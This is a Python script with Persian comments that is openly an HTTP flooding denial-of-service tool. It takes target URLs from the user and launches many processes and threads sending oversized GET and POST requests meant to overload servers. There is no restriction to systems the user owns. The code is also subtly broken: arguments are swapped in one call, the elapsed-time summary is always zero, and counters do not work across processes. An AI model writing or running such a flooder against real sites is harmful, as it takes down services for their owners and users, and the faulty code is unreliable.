import requests
import threading
import time
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import random
import signal
import sys
import os
import multiprocessing

# راه‌اندازی colorama
init()
ua = UserAgent()
request_count = 0
success_count = 0
fail_count = 0
lock = threading.Lock()
stop_attack = False

def send_heavy_request(urls):
    """ارسال درخواست سنگین به چندین URL برای فشار آوردن به سرور"""
    global request_count, success_count, fail_count
    headers = {
        "User-Agent": ua.random,
        "Cache-Control": "no-cache",
        "Pragma": "no-cache",
        "Connection": "keep-alive"
    }
    try:
        # انتخاب تصادفی یه URL از لیست
        url = random.choice(urls)
        method = random.choice(["GET", "POST"])
        if method == "GET":
            params = {f"param{random.randint(1,1000)}": "x" * random.randint(10000, 20000) for _ in range(50)}
            response = requests.get(url, headers=headers, params=params, timeout=1)
        else:
            data = {f"key{random.randint(1,1000)}": "x" * random.randint(10000, 20000) for _ in range(20)}
            response = requests.post(url, headers=headers, data=data, timeout=1)
        
        with lock:
            request_count += 1
            success_count += 1
            print(Fore.GREEN + f"[+] Request {request_count} | {method} | URL: {url} | Status: {response.status_code} | Size: {len(response.content)} bytes")
    except requests.exceptions.RequestException as e:
        with lock:
            request_count += 1
            fail_count += 1
            print(Fore.RED + f"[-] Request {request_count} Failed: {e}")

def attack_worker(urls, threads, duration):
    """تابع کارگر برای هر پروسس"""
    global stop_attack
    start_time = time.time()

    threads_list = []
    for i in range(threads):
        thread = threading.Thread(target=send_heavy_request, args=(urls,))
        threads_list.append(thread)
        thread.start()
        time.sleep(0.0001)  # فاصله خیلی کم برای فشار حداکثری

    while time.time() - start_time < duration and not stop_attack:
        elapsed = time.time() - start_time
        rate = request_count / elapsed if elapsed > 0 else 0
        print(Fore.BLUE + Style.BRIGHT + f"[LIVE STATS] Requests: {request_count} | Success: {success_count} | Failed: {fail_count} | Rate: {rate:.2f} req/s", end="\r")
        time.sleep(0.5)

    stop_attack = True
    for thread in threads_list:
        thread.join()

def start_ddos_attack(urls, threads, duration, workers):
    """شروع حمله با چندین پروسس"""
    global stop_attack
    print(Fore.YELLOW + Style.BRIGHT + "[*] Launching Extreme DDoS Simulation on VPS...")
    print(Fore.RED + Style.BRIGHT + f"[!] Warning: Using {workers} workers with {threads} threads each to overload the server!")

    def signal_handler(sig, frame):
        global stop_attack
        stop_attack = True
        print(Fore.RED + "\n[!] Attack Stopped by User!")
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    # ایجاد چندین پروسس برای شبیه‌سازی حمله توزیع‌شده
    processes = []
    for _ in range(workers):
        p = multiprocessing.Process(target=attack_worker, args=(urls, threads, duration))
        processes.append(p)
        p.start()

    for p in processes:
        p.join()

    elapsed = time.time() - time.time()
    print(Fore.MAGENTA + Style.BRIGHT + f"\n[ATTACK SUMMARY] Total Requests: {request_count} | Success: {success_count} | Failed: {fail_count} | Duration: {elapsed:.2f}s")

if __name__ == "__main__":
    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.WHITE + Style.BRIGHT + "\n=== Ultimate DDoS Simulation by [Your Name] ===")
    
    # دریافت چندین URL برای هدف قرار دادن
    print(Fore.WHITE + "Enter Target URLs (one per line, press Enter twice to finish):")
    urls = []
    while True:
        url = input(Fore.WHITE + "URL: ")
        if url.strip() == "":
            break
        urls.append(url.strip())
    
    if not urls:
        print(Fore.RED + "[!] No URLs provided! Exiting...")
        sys.exit(1)

    threads = int(input("Number of Threads per Worker (e.g., 1000-5000): "))
    workers = int(input("Number of Workers (e.g., 2-5): "))
    duration = int(input("Attack Duration (seconds, e.g., 60-120): "))

    start_ddos_attack(urls, threads, workers, duration)